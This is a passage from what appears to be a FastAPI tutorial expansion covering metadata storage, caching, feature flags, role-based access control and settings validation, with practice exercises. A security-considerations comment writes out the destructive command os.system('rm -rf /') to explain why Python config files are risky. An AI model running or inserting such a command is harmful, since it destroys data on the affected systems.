    """
    Keep backup, write new file, then replace.
    Provides rollback capability.
    """
    backup_file = METADATA_FILE + '.backup'

    # 1. Copy current file to backup
    if os.path.exists(METADATA_FILE):
        shutil.copy2(METADATA_FILE, backup_file)

    try:
        # 2. Write new data
        with open(METADATA_FILE, 'w') as f:
            json.dump(metadata, f, indent=4)
            f.flush()
            os.fsync(f.fileno())

        # 3. Success - can delete backup
        if os.path.exists(backup_file):
            os.remove(backup_file)

    except Exception as e:
        # 4. Error - restore from backup
        if os.path.exists(backup_file):
            shutil.move(backup_file, METADATA_FILE)
        raise e
```

---

### **Part 7: Performance Implications of Multiple Files**

**Current System:**

```python
@app.get("/api/files")
async def get_files():
    locks = load_locks()           # Read locks.json
    metadata = load_metadata()     # Read metadata.json
    parts = load_parts()           # Read parts.json (Level 24)
    # etc...

    # 3+ disk reads per request!
```

**Disk I/O Performance:**

```
Operation           Latency      Why it matters
────────────────────────────────────────────────
L1 cache ref        0.5 ns       CPU cache
L2 cache ref        7 ns         CPU cache
RAM access          100 ns       Main memory
SSD read            150 μs       150,000 ns!
HDD read            10 ms        10,000,000 ns!

Reading 3 JSON files from SSD: ~450 μs per request
Reading 3 JSON files from HDD: ~30 ms per request
```

**Optimization 1: In-Memory Cache**

```python
class MetadataCache:
    """
    Cache metadata in memory with invalidation.
    """
    def __init__(self, file_path):
        self.file_path = file_path
        self._data = None
        self._mtime = None  # Modification time

    def load(self):
        """
        Load from disk only if file changed.
        """
        try:
            current_mtime = os.path.getmtime(self.file_path)
        except FileNotFoundError:
            return {}

        # Check if cache is still valid
        if self._data is not None and self._mtime == current_mtime:
            return self._data  # Return cached data (O(1))

        # Cache miss - reload from disk
        with open(self.file_path, 'r') as f:
            self._data = json.load(f)
            self._mtime = current_mtime

        return self._data

    def invalidate(self):
        """Invalidate cache after write."""
        self._data = None
        self._mtime = None

# Global cache instances
metadata_cache = MetadataCache(METADATA_FILE)
locks_cache = MetadataCache(LOCK_FILE)

@app.get("/api/files")
async def get_files():
    locks = locks_cache.load()         # Fast: from RAM if not changed
    metadata = metadata_cache.load()   # Fast: from RAM if not changed

    # Still correct: checks mtime to detect external changes
```

**Performance comparison:**

```python
# Without cache:
# Request 1: 450 μs (3 × 150 μs disk reads)
# Request 2: 450 μs (3 × 150 μs disk reads)
# Request 3: 450 μs (3 × 150 μs disk reads)

# With cache:
# Request 1: 450 μs (3 × 150 μs disk reads - cold cache)
# Request 2: 0.5 μs (3 × 0.1 μs RAM reads - cache hit!)
# Request 3: 0.5 μs (3 × 0.1 μs RAM reads - cache hit!)

# 900× faster for cached requests!
```

**Optimization 2: Single JSON File (Denormalized)**

```python
# Instead of:
# - metadata.json
# - locks.json
# - parts.json

# Use single file: app_data.json
{
    "metadata": {
        "file1.mcam": {...},
        "file2.mcam": {...}
    },
    "locks": {
        "file1.mcam": {...}
    },
    "parts": {
        "1234567": {...}
    }
}

# Pros:
# + Single disk read (1/3 the I/O)
# + Atomic updates across all data

# Cons:
# - Larger file (slower parse)
# - Less modular
# - Lock contention (whole file locked on update)

# When to use:
# - Small datasets (< 10,000 entries)
# - Read-heavy workload
# - Atomic multi-table updates needed
```

---

### **Practice Exercise 1: Implement Metadata Migration**

```python
def migrate_metadata_v1_to_v2():
    """
    Migrate metadata from v1 (string description) to v2 (rich object).

    V1 format:
    {
        "file1.mcam": "Simple description string"
    }

    V2 format:
    {
        "file1.mcam": {
            "description": "Simple description string",
            "author": "unknown",
            "created_at": "2025-01-01T00:00:00Z",
            "revision": 0,
            "tags": []
        }
    }
    """
    # Your implementation here
    pass

# Test:
v1_data = {
    "file1.mcam": "Main component",
    "file2.mcam": "Secondary part"
}

v2_data = migrate_metadata_v1_to_v2(v1_data)

assert v2_data == {
    "file1.mcam": {
        "description": "Main component",
        "author": "unknown",
        "created_at": "2025-01-01T00:00:00Z",
        "revision": 0,
        "tags": []
    },
    "file2.mcam": {
        "description": "Secondary part",
        "author": "unknown",
        "created_at": "2025-01-01T00:00:00Z",
        "revision": 0,
        "tags": []
    }
}

# Solution:
def migrate_metadata_v1_to_v2(old_data):
    new_data = {}
    default_timestamp = datetime.datetime(2025, 1, 1).isoformat() + 'Z'

    for filename, description in old_data.items():
        # Detect if already migrated
        if isinstance(description, dict):
            new_data[filename] = description
            continue

        # Migrate string to object
        new_data[filename] = {
            "description": description,
            "author": "unknown",
            "created_at": default_timestamp,
            "revision": 0,
            "tags": []
        }

    return new_data
```

---

### **Practice Exercise 2: Integrity Checker**

```python
def check_integrity():
    """
    Verify referential integrity across all JSON files.

    Returns list of integrity violations:
    [
        {"type": "orphaned_metadata", "filename": "missing.mcam"},
        {"type": "missing_metadata", "filename": "file1.mcam"},
        {"type": "orphaned_lock", "filename": "deleted.mcam"}
    ]
    """
    violations = []

    # Load all data sources
    files = set(os.listdir(REPO_PATH))
    metadata = load_metadata()
    locks = load_locks()

    # Your implementation here
    # Check for:
    # 1. Metadata for non-existent files
    # 2. Files without metadata
    # 3. Locks for non-existent files

    return violations

# Solution:
def check_integrity():
    violations = []

    # Get all .mcam files
    try:
        all_files = set(
            f for f in os.listdir(REPO_PATH)
            if f.endswith('.mcam')
        )
    except FileNotFoundError:
        return [{"type": "missing_repo_directory"}]

    metadata = load_metadata()
    locks = load_locks()

    # Check 1: Orphaned metadata
    for filename in metadata.keys():
        if filename not in all_files:
            violations.append({
                "type": "orphaned_metadata",
                "filename": filename,
                "severity": "warning",
                "fix": "Remove metadata entry"
            })

    # Check 2: Missing metadata
    for filename in all_files:
        if filename not in metadata:
            violations.append({
                "type": "missing_metadata",
                "filename": filename,
                "severity": "info",
                "fix": "Create metadata entry"
            })

    # Check 3: Orphaned locks
    for filename in locks.keys():
        if filename not in all_files:
            violations.append({
                "type": "orphaned_lock",
                "filename": filename,
                "severity": "error",
                "fix": "Remove lock entry"
            })

    # Check 4: Invalid metadata format
    for filename, meta in metadata.items():
        if not isinstance(meta, dict):
            violations.append({
                "type": "invalid_metadata_format",
                "filename": filename,
                "severity": "error"
            })
            continue

        required_fields = ['description', 'author', 'revision']
        for field in required_fields:
            if field not in meta:
                violations.append({
                    "type": "missing_field",
                    "filename": filename,
                    "field": field,
                    "severity": "error"
                })

    return violations

# Create integrity check endpoint:
@app.get("/api/admin/integrity-check")
async def integrity_check_endpoint(current_user: dict = Depends(get_current_user)):
    if current_user['role'] != 'admin':
        raise HTTPException(status_code=403)

    violations = check_integrity()
    return {
        "total_violations": len(violations),
        "by_severity": {
            "error": sum(1 for v in violations if v.get('severity') == 'error'),
            "warning": sum(1 for v in violations if v.get('severity') == 'warning'),
            "info": sum(1 for v in violations if v.get('severity') == 'info')
        },
        "violations": violations
    }
```

---

### **Practice Exercise 3: Metadata Query Language**

```python
def query_metadata(metadata, query):
    """
    Implement simple query language for metadata.

    Examples:
    query_metadata(metadata, "author = john")
    query_metadata(metadata, "revision > 5")
    query_metadata(metadata, "description contains 'urgent'")
    query_metadata(metadata, "author = john AND revision > 3")
    """
    # Your implementation:
    # 1. Parse query string into AST
    # 2. Evaluate query against each metadata entry
    # 3. Return matching filenames
    pass

# Test cases:
metadata = {
    "file1.mcam": {"author": "john", "revision": 5, "description": "Main part"},
    "file2.mcam": {"author": "jane", "revision": 3, "description": "Secondary part"},
    "file3.mcam": {"author": "john", "revision": 10, "description": "Urgent fix"}
}

assert query_metadata(metadata, "author = john") == ["file1.mcam", "file3.mcam"]
assert query_metadata(metadata, "revision > 5") == ["file3.mcam"]
assert query_metadata(metadata, "description contains urgent") == ["file3.mcam"]

# Solution (simplified - production would use proper parser):
import re

def query_metadata(metadata, query):
    # Simple parser for basic queries
    query = query.lower().strip()

    # Handle "AND" (extend for OR, NOT, etc.)
    if ' and ' in query:
        parts = query.split(' and ')
        # Get intersection of results
        results = set(query_metadata(metadata, parts[0]))
        for part in parts[1:]:
            results &= set(query_metadata(metadata, part))
        return list(results)

    # Parse single condition
    if ' contains ' in query:
        field, value = query.split(' contains ')
        value = value.strip().strip("'\"")
        return [
            filename
            for filename, meta in metadata.items()
            if value in str(meta.get(field, '')).lower()
        ]

    if ' > ' in query:
        field, value = query.split(' > ')
        value = int(value.strip())
        return [
            filename
            for filename, meta in metadata.items()
            if isinstance(meta.get(field), (int, float)) and meta[field] > value
        ]

    if ' = ' in query:
        field, value = query.split(' = ')
        value = value.strip().strip("'\"")
        return [
            filename
            for filename, meta in metadata.items()
            if str(meta.get(field, '')).lower() == value
        ]

    return []
```

---

Ready for Level 12 when you are. Next covers building admin interfaces, role-based UI rendering, and the settings management system that makes features configurable.

## **Level 12 Enhancement: Building Admin Interfaces - Settings System**

**Reference:** Your tutorial introduces a settings system with admin-only features, role-based UI rendering, and configurable application behavior.

**Depth Needed:** This level introduces configuration management, role-based access control (RBAC), and feature flags - fundamental patterns in software architecture. We're building a system that makes the application behavior configurable without code changes.

---

### **Part 1: Configuration Management - The Hierarchy Problem**

**What is Configuration?**

```
Configuration = Data that changes application behavior without changing code

Examples:
- Feature flags: Is checkout enabled?
- Business rules: Max file size = 100MB
- UI preferences: Theme = dark mode
- Integration settings: API endpoint = https://...
```

**The Configuration Hierarchy (Order of Precedence):**

```
1. Command-line arguments    (Highest priority)
   python app.py --debug=true

2. Environment variables
   export DEBUG=true

3. Configuration file
   settings.json: {"debug": true}

4. Application defaults       (Lowest priority)
   const DEBUG = false

Why this order?
- Deployment flexibility (override without changing files)
- Security (secrets in env vars, not committed to git)
- Convenience (defaults work out of box)
```

**Your Tutorial's Settings Structure:**

```python
# settings.json
{
    "features": {
        "checkout_enabled": true,
        "admin_panel_enabled": true,
        "file_upload_enabled": false
    },
    "limits": {
        "max_file_size_mb": 100,
        "max_files_per_user": 50
    },
    "ui": {
        "theme": "light",
        "items_per_page": 25
    }
}
```

---

### **Part 2: Feature Flags - The A/B Testing Primitive**

**What are Feature Flags?**

```
Feature Flag = Boolean switch that enables/disables functionality

Purpose:
- Deploy code but don't activate yet (dark launch)
- A/B test features with subset of users
- Kill switch for problematic features
- Gradual rollout (1% → 10% → 100% of users)
```

**Implementation Patterns:**

**Pattern 1: Simple Boolean (Your Tutorial)**

```python
settings = load_settings()

@app.post("/api/files/checkout")
async def checkout_file(request: CheckoutRequest):
    # Check feature flag
    if not settings.get("features", {}).get("checkout_enabled", True):
        raise HTTPException(
            status_code=503,
            detail="Checkout feature is currently disabled"
        )

    # Proceed with checkout
    ...
```

**Pattern 2: Percentage Rollout**

```python
settings = {
    "features": {
        "new_ui_rollout_percent": 25  # Show to 25% of users
    }
}

def is_feature_enabled(user_id: str, feature: str) -> bool:
    """
    Deterministic feature flag based on user ID.
    Same user always gets same result (consistent experience).
    """
    rollout_percent = settings["features"].get(f"{feature}_rollout_percent", 100)

    # Hash user ID to get consistent number in [0, 100)
    hash_value = hashlib.md5(user_id.encode()).hexdigest()
    user_bucket = int(hash_value, 16) % 100

    return user_bucket < rollout_percent

# Usage:
if is_feature_enabled(current_user["id"], "new_ui"):
    return render_new_ui()
else:
    return render_old_ui()
```

**Pattern 3: User Segment Targeting**

```python
settings = {
    "features": {
        "beta_features": {
            "enabled_for_roles": ["admin", "beta_tester"],
            "enabled_for_users": ["john@example.com"],
            "enabled_for_domains": ["@company.com"]
        }
    }
}

def is_feature_enabled(user: dict, feature: str) -> bool:
    feature_config = settings["features"].get(feature, {})

    # Check role
    if user["role"] in feature_config.get("enabled_for_roles", []):
        return True

    # Check specific user
    if user["email"] in feature_config.get("enabled_for_users", []):
        return True

    # Check domain
    user_domain = "@" + user["email"].split("@")[1]
    if user_domain in feature_config.get("enabled_for_domains", []):
        return True

    return False
```

**The Hash Function for Consistent Bucketing:**

```python
import hashlib

def hash_user_to_bucket(user_id: str, num_buckets: int = 100) -> int:
    """
    Map user ID to consistent bucket [0, num_buckets).

    Properties:
    1. Deterministic: Same user_id always returns same bucket
    2. Uniform: Buckets are evenly distributed
    3. Independent: Changing one user doesn't affect others

    Time Complexity: O(len(user_id)) for hashing
    """
    # MD5 produces 128-bit hash
    hash_bytes = hashlib.md5(user_id.encode('utf-8')).digest()

    # Convert first 8 bytes to integer
    hash_int = int.from_bytes(hash_bytes[:8], byteorder='big')

    # Modulo gives bucket in [0, num_buckets)
    return hash_int % num_buckets

# Example: 25% rollout
user_bucket = hash_user_to_bucket("user123")  # Returns: 42
is_enabled = user_bucket < 25  # 42 >= 25, so False

# Same user always gets same bucket:
assert hash_user_to_bucket("user123") == hash_user_to_bucket("user123")

# Different users get different buckets (uniform distribution):
buckets = [hash_user_to_bucket(f"user{i}") for i in range(10000)]
# Each bucket 0-99 should have ~100 users (10000 / 100)
from collections import Counter
distribution = Counter(buckets)
print(distribution.most_common(5))
# [(17, 103), (42, 102), (8, 101), (91, 101), (33, 100)]
# Nearly uniform!
```

**Why MD5 for bucketing?**

```python
# MD5 properties:
# 1. Deterministic: Same input → same output
# 2. Uniform distribution: Output spread evenly across range
# 3. Fast: ~10 million hashes/second
# 4. Not cryptographically secure (but we don't need security here)

# Alternative: SHA256 (slower but more secure - overkill for bucketing)
# Alternative: MurmurHash (faster but requires external library)

# Time complexity comparison:
# MD5:        O(n) where n = input length, ~100ns for short strings
# SHA256:     O(n) but ~2× slower than MD5
# MurmurHash: O(n) but ~2× faster than MD5
```

---

### **Part 3: Role-Based Access Control (RBAC) - The Security Model**

**RBAC Theory:**

```
Users → Roles → Permissions → Resources

Example:
User "john@example.com"
  → Has role "admin"
    → Admin role has permission "manage_settings"
      → Can access /api/admin/settings endpoint
```

**Implementation Levels:**

**Level 1: Simple Role Check (Your Tutorial)**

```python
def require_admin(user: dict):
    """
    Simple role check.
    """
    if user.get("role") != "admin":
        raise HTTPException(
            status_code=403,
            detail="Admin access required"
        )

@app.post("/api/admin/settings")
async def update_settings(
    new_settings: dict,
    current_user: dict = Depends(get_current_user)
):
    require_admin(current_user)
    # Proceed with privileged operation
```

**Level 2: Permission-Based (More Flexible)**

```python
# Define role-permission mapping
ROLE_PERMISSIONS = {
    "admin": {
        "read_all_files",
        "write_all_files",
        "manage_settings",
        "manage_users",
        "view_audit_log"
    },
    "editor": {
        "read_all_files",
        "write_own_files",
        "view_audit_log"
    },
    "viewer": {
        "read_own_files"
    }
}

def user_has_permission(user: dict, permission: str) -> bool:
    """
    Check if user's role grants permission.

    Time Complexity: O(1) - set lookup
    """
    user_role = user.get("role", "viewer")
    permissions = ROLE_PERMISSIONS.get(user_role, set())
    return permission in permissions

def require_permission(permission: str):
    """
    Dependency that checks permission.
    """
    def permission_checker(current_user: dict = Depends(get_current_user)):
        if not user_has_permission(current_user, permission):
            raise HTTPException(
                status_code=403,
                detail=f"Permission '{permission}' required"
            )
        return current_user
    return permission_checker

# Usage in endpoint:
@app.post("/api/admin/settings")
async def update_settings(
    new_settings: dict,
    user: dict = Depends(require_permission("manage_settings"))
):
    # Only users with manage_settings permission can reach here
    ...
```

**Level 3: Resource-Level Permissions (Most Flexible)**

```python
# Permission model: (user, action, resource) → bool

def can_user_perform_action(user: dict, action: str, resource: dict) -> bool:
    """
    Check if user can perform action on specific resource.

    Examples:
    - can_user_perform_action(john, "edit", file1) → True if john owns file1
    - can_user_perform_action(john, "delete", file2) → False if john doesn't own file2
    """
    # Admin can do anything
    if user["role"] == "admin":
        return True

    # Check resource ownership
    if action in ["edit", "delete"]:
        return resource.get("author") == user["email"]

    # Check based on resource visibility
    if action == "read":
        if resource.get("visibility") == "public":
            return True
        if resource.get("visibility") == "private":
            return resource.get("author") == user["email"]
        if resource.get("visibility") == "team":
            return user["team"] == resource.get("team")

    return False

# Usage:
@app.delete("/api/files/{filename}")
async def delete_file(
    filename: str,
    current_user: dict = Depends(get_current_user)
):
    file_metadata = load_metadata().get(filename)

    if not can_user_perform_action(current_user, "delete", file_metadata):
        raise HTTPException(
            status_code=403,
            detail="You don't have permission to delete this file"
        )

    # Proceed with deletion
    ...
```

**The Access Control Matrix:**

```
Conceptual representation of permissions:

           file1.mcam  file2.mcam  settings.json
           ──────────  ──────────  ─────────────
john       R,W         R           -
jane       R           R,W,D       -
admin      R,W,D       R,W,D       R,W

R = Read, W = Write, D = Delete

In practice, stored as:
{
    "file1.mcam": {
        "john": ["read", "write"],
        "jane": ["read"]
    },
    "file2.mcam": {
        "john": ["read"],
        "jane": ["read", "write", "delete"]
    }
}

Time Complexity:
- Check permission: O(1) average (hash table lookup)
- Grant permission: O(1) average
- List user's files: O(n) where n = total files
```

---

### **Part 4: Settings Validation - Type Safety for Configuration**

**The Problem: Invalid Configuration**

```python
# What if settings.json contains:
{
    "limits": {
        "max_file_size_mb": "one hundred"  # Should be number!
    }
}

# Code that assumes it's a number will crash:
if file_size > settings["limits"]["max_file_size_mb"] * 1024 * 1024:
    # TypeError: '>' not supported between 'int' and 'str'
```

**Solution: Pydantic Settings Model**

```python
from pydantic import BaseModel, Field, validator

class FeatureSettings(BaseModel):
    checkout_enabled: bool = True
    admin_panel_enabled: bool = True
    file_upload_enabled: bool = False

class LimitSettings(BaseModel):
    max_file_size_mb: int = Field(
        default=100,
        ge=1,      # Greater than or equal to 1
        le=1000,   # Less than or equal to 1000
        description="Maximum file size in megabytes"
    )
    max_files_per_user: int = Field(
        default=50,
        ge=1,
        le=10000
    )

    @validator('max_file_size_mb')
    def validate_file_size(cls, v):
        """Additional business logic validation."""
        if v > 500:
            # Warn but don't fail
            import warnings
            warnings.warn(f"Large max_file_size_mb: {v}MB")
        return v

class UISettings(BaseModel):
    theme: str = Field(
        default="light",
        regex="^(light|dark)$"  # Only allow these values
    )
    items_per_page: int = Field(
        default=25,
        ge=10,
        le=100
    )

class AppSettings(BaseModel):
    features: FeatureSettings = FeatureSettings()
    limits: LimitSettings = LimitSettings()
    ui: UISettings = UISettings()

    class Config:
        # Allow extra fields (forward compatibility)
        extra = "allow"

# Loading with validation:
def load_settings() -> AppSettings:
    try:
        with open(SETTINGS_FILE, 'r') as f:
            data = json.load(f)

        # Validate and parse
        settings = AppSettings(**data)
        return settings

    except FileNotFoundError:
        # Return defaults if file doesn't exist
        return AppSettings()

    except ValidationError as e:
        # Log validation errors
        print(f"Invalid settings: {e}")
        print("Using default settings")
        return AppSettings()

# Usage - guaranteed type safety:
settings = load_settings()
max_size = settings.limits.max_file_size_mb  # Guaranteed to be int in [1, 1000]
```

**Default Values Strategy:**

```python
# Strategy 1: Application defaults (in code)
class Settings(BaseModel):
    debug: bool = False  # Default in model definition

# Strategy 2: Factory function
def get_default_settings() -> dict:
    return {
        "debug": os.getenv("DEBUG", "false").lower() == "true",
        "environment": os.getenv("ENVIRONMENT", "production")
    }

# Strategy 3: Cascade (check multiple sources)
def load_settings_cascade() -> AppSettings:
    """
    Load settings from multiple sources in priority order.
    """
    settings = {}

    # 1. Start with application defaults
    settings.update(AppSettings().dict())

    # 2. Override with file settings
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            file_settings = json.load(f)
            settings = deep_merge(settings, file_settings)

    # 3. Override with environment variables
    env_settings = parse_env_settings()
    settings = deep_merge(settings, env_settings)

    # 4. Override with command-line arguments
    cli_settings = parse_cli_args()
    settings = deep_merge(settings, cli_settings)

    return AppSettings(**settings)

def deep_merge(base: dict, override: dict) -> dict:
    """
    Recursively merge dictionaries.

    Time Complexity: O(n) where n = total keys in both dicts
    """
    result = base.copy()

    for key, value in override.items():
        if key in result and isinstance(result[key], dict) and isinstance(value, dict):
            # Recursively merge nested dicts
            result[key] = deep_merge(result[key], value)
        else:
            # Override value
            result[key] = value

    return result
```

---

### **Part 5: Dynamic UI Based on Roles**

**The Pattern: Conditional Rendering**

```javascript
// Frontend receives user info
const currentUser = {
  email: "john@example.com",
  role: "admin",
};

// Render UI based on role
function renderUI() {
  const container = document.getElementById("app");

  // Always show these
  container.innerHTML = `
        <nav>
            <a href="/files">Files</a>
            ${renderAdminLinks()}
        </nav>
    `;
}

function renderAdminLinks() {
  // Only admins see admin panel
  if (currentUser.role !== "admin") {
    return ""; // Return empty string for non-admins
  }

  return `
        <a href="/admin">Admin Panel</a>
        <a href="/admin/settings">Settings</a>
        <a href="/admin/users">Users</a>
    `;
}
```

**Security Critical: Server-Side Enforcement**

```javascript
// WRONG: Hiding UI elements is NOT security!
function renderAdminButton() {
  if (currentUser.role === "admin") {
    return '<button onclick="deleteAllFiles()">Delete All</button>';
  }
  return ""; // Hidden from UI, but...
}

// Attacker can still call the function directly:
deleteAllFiles(); // Still works if function exists!

// Or make API request directly:
fetch("/api/admin/delete-all", { method: "POST" }); // If not protected server-side!
```

**Correct approach:**

```python
# Server MUST validate permissions
@app.post("/api/admin/delete-all")
async def delete_all_files(current_user: dict = Depends(get_current_user)):
    # ALWAYS check on server
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403)

    # Now safe to proceed
    ...

# Frontend only hides UI for better UX
# Security is enforced on server
```

---

### **Part 6: Settings Hot-Reload - Dynamic Configuration**

**The Challenge: Update Settings Without Restart**

```python
# Problem: Settings loaded once at startup
settings = load_settings()  # Loaded when module imported

# Changes to settings.json don't take effect until restart
# Solution: Reload settings periodically or on-demand
```

**Implementation 1: File Watcher**

```python
import time
import threading

class SettingsManager:
    """
    Automatically reload settings when file changes.
    """
    def __init__(self, settings_file: str, check_interval: float = 5.0):
        self.settings_file = settings_file
        self.check_interval = check_interval
        self._settings = self._load()
        self._last_mtime = self._get_mtime()

        # Start background thread
        self._stop_event = threading.Event()
        self._watcher_thread = threading.Thread(
            target=self._watch_file,
            daemon=True
        )
        self._watcher_thread.start()

    def _load(self) -> AppSettings:
        """Load and validate settings."""
        try:
            with open(self.settings_file, 'r') as f:
                data = json.load(f)
            return AppSettings(**data)
        except Exception as e:
            print(f"Error loading settings: {e}")
            return AppSettings()  # Return defaults

    def _get_mtime(self) -> float:
        """Get file modification time."""
        try:
            return os.path.getmtime(self.settings_file)
        except FileNotFoundError:
            return 0

    def _watch_file(self):
        """Background thread that watches for file changes."""
        while not self._stop_event.is_set():
            current_mtime = self._get_mtime()

            if current_mtime != self._last_mtime:
                print("Settings file changed, reloading...")
                self._settings = self._load()
                self._last_mtime = current_mtime

            time.sleep(self.check_interval)

    @property
    def settings(self) -> AppSettings:
        """Get current settings (always up-to-date)."""
        return self._settings

    def stop(self):
        """Stop the watcher thread."""
        self._stop_event.set()
        self._watcher_thread.join()

# Global settings manager
settings_manager = SettingsManager(SETTINGS_FILE)

# Usage in endpoints:
@app.get("/api/files")
async def get_files():
    settings = settings_manager.settings  # Always current
    if not settings.features.file_listing_enabled:
        raise HTTPException(status_code=503)
    ...
```

**Implementation 2: Signal-Based Reload**

```python
import signal

class SettingsManager:
    def __init__(self, settings_file: str):
        self.settings_file = settings_file
        self._settings = self._load()

        # Register signal handler
        signal.signal(signal.SIGUSR1, self._reload_handler)
        print(f"Send SIGUSR1 to PID {os.getpid()} to reload settings")

    def _reload_handler(self, signum, frame):
        """Called when SIGUSR1 received."""
        print("Received reload signal, reloading settings...")
        self._settings = self._load()

    def _load(self) -> AppSettings:
        # Same as before
        pass

# Reload settings from command line:
# kill -SIGUSR1 <pid>
```

**Implementation 3: API Endpoint for Reload**

```python
@app.post("/api/admin/reload-settings")
async def reload_settings(current_user: dict = Depends(require_admin)):
    """
    Manually trigger settings reload.
    Useful for containerized deployments.
    """
    try:
        settings_manager.reload()
        return {"status": "success", "message": "Settings reloaded"}
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Failed to reload settings: {str(e)}"
        )
```

---

### **Part 7: Configuration File Formats - Trade-offs**

**JSON vs YAML vs TOML vs Python**

```python
# JSON (your tutorial uses this)
{
    "database": {
        "host": "localhost",
        "port": 5432
    }
}

# Pros:
# + Universal (every language can parse)
# + Simple syntax
# + Fast parsing
# Cons:
# - No comments
# - Verbose for complex data
# - No trailing commas (strict)

# YAML
database:
  host: localhost
  port: 5432
  # This is a comment

# Pros:
# + Human-readable
# + Comments supported
# + Less verbose than JSON
# Cons:
# - Indentation-sensitive (error-prone)
# - Slower parsing
# - Complex spec (has surprising behaviors)

# TOML
[database]
host = "localhost"
port = 5432
# This is a comment

# Pros:
# + Comments supported
# + Clear section headers
# + Simpler than YAML
# Cons:
# - Less universal than JSON
# - Nested structures more verbose

# Python (config.py)
DATABASE = {
    'host': 'localhost',
    'port': 5432
}

# Pros:
# + Can use Python expressions
# + Easy to import
# + IDE support
# Cons:
# - Security risk (code execution)
# - Python-only
# - Not hot-reloadable
```

**Security Considerations:**

```python
# DANGER: Loading Python config files
# config.py could contain malicious code!

# BAD:
import importlib
config = importlib.import_module('config')
# If config.py contains: os.system('rm -rf /'), it executes!

# BETTER: Use JSON (data only, no code)
with open('config.json') as f:
    config = json.load(f)
# JSON can only contain data, not executable code

# BEST: Use schema validation
config = AppSettings(**json.load(f))
# Pydantic ensures only expected fields with correct types
```

---

### **Practice Exercise 1: Implement Settings Migration**

```python
def migrate_settings_v1_to_v2():
    """
    Migrate settings from v1 to v2 schema.

    V1:
    {
        "checkout_enabled": true,
        "max_file_size": 100
    }

    V2:
    {
        "version": 2,
        "features": {
            "checkout_enabled": true
        },
        "limits": {
            "max_file_size_mb": 100
        }
    }
    """
    # Your implementation here
    pass

# Test:
v1_settings = {
    "checkout_enabled": True,
    "max_file_size": 100,
    "theme": "dark"
}

v2_settings = migrate_settings_v1_to_v2(v1_settings)

assert v2_settings == {
    "version": 2,
    "features": {
        "checkout_enabled": True
    },
    "limits": {
        "max_file_size_mb": 100
    },
    "ui": {
        "theme": "dark"
    }
}

# Solution:
def migrate_settings_v1_to_v2(v1_settings):
    # Detect version
    if v1_settings.get("version") == 2:
        return v1_settings  # Already migrated

    v2_settings = {
        "version": 2,
        "features": {},
        "limits": {},
        "ui": {}
    }

    # Migrate feature flags
    feature_keys = ["checkout_enabled", "admin_panel_enabled", "file_upload_enabled"]
    for key in feature_keys:
        if key in v1_settings:
            v2_settings["features"][key] = v1_settings[key]

    # Migrate limits
    limit_mappings = {
        "max_file_size": "max_file_size_mb",
        "max_files_per_user": "max_files_per_user"
    }
    for old_key, new_key in limit_mappings.items():
        if old_key in v1_settings:
            v2_settings["limits"][new_key] = v1_settings[old_key]

    # Migrate UI settings
    ui_keys = ["theme", "items_per_page"]
    for key in ui_keys:
        if key in v1_settings:
            v2_settings["ui"][key] = v1_settings[key]

    return v2_settings

# Automatic migration on load:
def load_settings_with_migration():
    with open(SETTINGS_FILE, 'r') as f:
        data = json.load(f)

    # Check version and migrate if needed
    version = data.get("version", 1)

    if version == 1:
        print("Migrating settings from v1 to v2...")
        data = migrate_settings_v1_to_v2(data)

        # Save migrated settings
        with open(SETTINGS_FILE, 'w') as f:
            json.dump(data, f, indent=4)

        print("Migration complete")

    return AppSettings(**data)
```

---

### **Practice Exercise 2: Implement Permission Inheritance**

```python
def get_effective_permissions(user: dict) -> set:
    """
    Calculate effective permissions including inherited ones.

    Role hierarchy:
    admin > manager > editor > viewer

    Each role inherits permissions from roles below it.
    """
    # Your implementation here
    pass

# Test:
ROLE_HIERARCHY = {
    "viewer": set(),
    "editor": {"viewer"},  # Inherits from viewer
    "manager": {"editor"},  # Inherits from editor (and viewer)
    "admin": {"manager"}    # Inherits from all
}

ROLE_PERMISSIONS = {
    "viewer": {"read_files"},
    "editor": {"write_files", "delete_own_files"},
    "manager": {"delete_any_files", "view_analytics"},
    "admin": {"manage_users", "manage_settings"}
}

user = {"role": "manager"}
permissions = get_effective_permissions(user)

# Manager should have:
# - Own permissions: delete_any_files, view_analytics
# - Editor permissions: write_files, delete_own_files
# - Viewer permissions: read_files
assert permissions == {
    "read_files",
    "write_files",
    "delete_own_files",
    "delete_any_files",
    "view_analytics"
}

# Solution:
def get_effective_permissions(user: dict) -> set:
    """
    Recursively collect permissions from role hierarchy.

    Time Complexity: O(r * p) where:
    - r = number of roles in hierarchy
    - p = average permissions per role

    Space Complexity: O(r) for recursion stack + O(p) for result set
    """
    role = user.get("role", "viewer")

    # Collect permissions recursively
    def collect_permissions(role_name: str, visited: set = None) -> set:
        if visited is None:
            visited = set()

        # Prevent infinite loops in case of circular hierarchy
        if role_name in visited:
            return set()
        visited.add(role_name)

        # Get this role's direct permissions
        permissions = ROLE_PERMISSIONS.get(role_name, set()).copy()

        # Get inherited roles
        parent_roles = ROLE_HIERARCHY.get(role_name, set())

        # Recursively collect permissions from parent roles
        for parent_role in parent_roles:
            permissions.update(collect_permissions(parent_role, visited))

        return permissions

    return collect_permissions(role)

# Optimization: Cache effective permissions
_permission_cache = {}

def get_effective_permissions_cached(user: dict) -> set:
    role = user.get("role", "viewer")

    if role not in _permission_cache:
        _permission_cache[role] = get_effective_permissions(user)

    return _permission_cache[role]

# Invalidate cache when permissions change
def update_role_permissions(role: str, permissions: set):
    ROLE_PERMISSIONS[role] = permissions
    _permission_cache.clear()  # Invalidate entire cache
```

---

### **Practice Exercise 3: Implement A/B Test Framework**

```python
class ABTestFramework:
    """
    Framework for running A/B tests with statistics.
    """
    def __init__(self):
        self.tests = {}  # test_name → test_config
        self.results = {}  # test_name → {variant → [conversion_data]}

    def create_test(self, name: str, variants: list, allocation: dict):
        """
        Create new A/B test.

        Example:
        create_test(
            name="button_color",
            variants=["blue", "green", "red"],
            allocation={"blue": 0.5, "green": 0.3, "red": 0.2}
        )
        """
        # Your implementation
        pass

    def get_variant(self, test_name: str, user_id: str) -> str:
        """
        Assign user to variant consistently.
        """
        # Your implementation
        pass

    def record_conversion(self, test_name: str, user_id: str, value: float):
        """
        Record conversion event.
        """
        # Your implementation
        pass

    def get_results(self, test_name: str) -> dict:
        """
        Calculate test results with statistical significance.

        Returns:
        {
            "blue": {
                "users": 1000,
                "conversions": 150,
                "conversion_rate": 0.15,
                "confidence": 0.95
            },
            "green": {...}
        }
        """
        # Your implementation
        pass

# Solution:
import hashlib
